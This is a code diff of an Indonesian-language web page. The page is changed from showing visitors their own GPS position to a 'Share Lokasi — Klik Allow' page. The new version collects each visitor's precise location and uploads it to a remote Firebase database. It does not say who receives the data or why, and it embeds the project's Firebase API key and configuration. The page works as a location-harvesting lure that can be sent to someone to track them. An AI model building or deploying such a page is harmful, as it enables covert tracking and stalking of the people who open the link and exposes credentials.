@@ -1,66 +1,79 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Tracking GPS Real-Time</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
-            text-align: center;
-            padding: 50px;
-        }
-        h1 {
-            color: #333;
-        }
-        p {
-            font-size: 18px;
-        }
-        #coords {
-            margin-top: 20px;
-            font-weight: bold;
-            color: #007BFF;
-        }
-    </style>
+  <meta charset="utf-8">
+  <title>Share Lokasi</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background-color: #f5f5f5;
+    }
+    h2 { color: #333; }
+    p { font-size: 18px; }
+    #status { font-weight: bold; margin-top: 20px; color: #007BFF; }
+  </style>
 </head>
 <body>
-    <h1>Lokasi Saat Ini (Real-Time)</h1>
-    <p id="status">Menunggu lokasi...</p>
-    <p id="coords"></p>
-    <p id="time"></p>
+  <h2>Share Lokasi — Klik Allow</h2>
+  <p id="status">Menunggu...</p>
 
-    <script>
-        const status = document.getElementById('status');
-        const coords = document.getElementById('coords');
-        const time = document.getElementById('time');
+  <!-- Firebase SDK dari CDN -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
-        if (!navigator.geolocation) {
-            status.textContent = 'Geolocation tidak didukung oleh browser ini.';
-        } else {
-            status.textContent = 'Mencari lokasi…';
-            // Update lokasi setiap 3 detik
-            navigator.geolocation.watchPosition(success, error, {
-                enableHighAccuracy: true,
-                maximumAge: 0,
-                timeout: 10000
-            });
-        }
+  <script>
+    const statusEl = document.getElementById('status');
 
-        function success(position) {
-            const latitude  = position.coords.latitude.toFixed(6);
-            const longitude = position.coords.longitude.toFixed(6);
-            const accuracy  = position.coords.accuracy.toFixed(2);
-            const now = new Date();
+    // ======= Firebase Config milikmu =======
+    const firebaseConfig = {
+      apiKey: "AIzaSyBffrwvdzVsGcFgjvhvc1FbeaXXJ43DcF8",
+      authDomain: "my-project-c0014.firebaseapp.com",
+      databaseURL: "https://my-project-c0014-default-rtdb.firebaseio.com",
+      projectId: "my-project-c0014",
+      storageBucket: "my-project-c0014.appspot.com",
+      messagingSenderId: "1035321216653",
+      appId: "1:1035321216653:web:cefac47b06ef39a90adcc4",
+      measurementId: "G-G4PJ707CD6"
+    };
+    // =======================================
 
-            status.textContent = 'Lokasi ditemukan!';
-            coords.textContent = `Latitude: ${latitude}, Longitude: ${longitude}, Akurasi: ±${accuracy} m`;
-            time.textContent = `Terakhir update: ${now.toLocaleTimeString()}`;
-        }
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-        function error(err) {
-            status.textContent = `Gagal mendapatkan lokasi: ${err.message}`;
-            coords.textContent = '';
-            time.textContent = '';
-        }
-    </script>
+    if (!navigator.geolocation) {
+      statusEl.textContent = 'Browser tidak mendukung Geolocation.';
+    } else {
+      statusEl.textContent = 'Mencari lokasi…';
+      navigator.geolocation.getCurrentPosition(sendPosition, err => {
+        statusEl.textContent = 'Gagal: ' + err.message;
+      }, { enableHighAccuracy: true, timeout: 10000 });
+    }
+
+    function sendPosition(pos) {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+      const ts = Date.now();
+
+      // Buat ID unik tiap pengunjung
+      const visitorId = 'v_' + Math.random().toString(36).slice(2,9);
+
+      // Simpan ke database Firebase
+      db.ref('locations/' + visitorId).set({
+        lat: lat,
+        lon: lon,
+        accuracy: acc,
+        ts: ts,
+        label: visitorId
+      }).then(()=> {
+        statusEl.textContent = 'Lokasi dikirim. Terima kasih.';
+      }).catch(e=>{
+        statusEl.textContent = 'Gagal kirim: ' + e.message;
+      });
+    }
+  </script>
 </body>
 </html>
